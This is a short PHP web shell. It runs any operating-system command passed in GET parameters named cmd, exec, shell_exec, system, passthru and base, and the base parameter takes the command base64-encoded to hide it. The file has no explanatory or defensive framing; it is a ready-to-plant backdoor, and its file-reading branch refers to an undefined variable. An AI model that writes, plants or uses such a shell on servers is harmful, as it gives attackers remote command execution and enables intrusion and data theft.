<?php

echo "=======================================================";
if (isset($_GET['cmd'])) {

    echo "<pre>". system($_GET['cmd']) . "</pre>";

} 
if (isset($_GET['exec'])) {
    exec($_GET['exec'], $output, $status);
    echo "<pre>". print_r($output) . "</pre>";

} 
if (isset($_GET['shell_exec'])) {
    
    echo "<pre>". shell_exec($_GET['shell_exec']) . "</pre>";

}
if (isset($_GET['system'])) {
    
    echo "<pre>". system($_GET['system']) . "</pre>";

}
if (isset($_GET['passthru'])) {
    
    echo "<pre>". passthru($_GET['passthru']) . "</pre>";

}
if (isset($_GET['page'])) {
    
    echo file_get_contents($page);
}
if (isset($_GET['base'])) {
    $decoded = base64_decode($_GET['base']);
    echo "<pre>". shell_exec($decoded) . "</pre>";
}

?>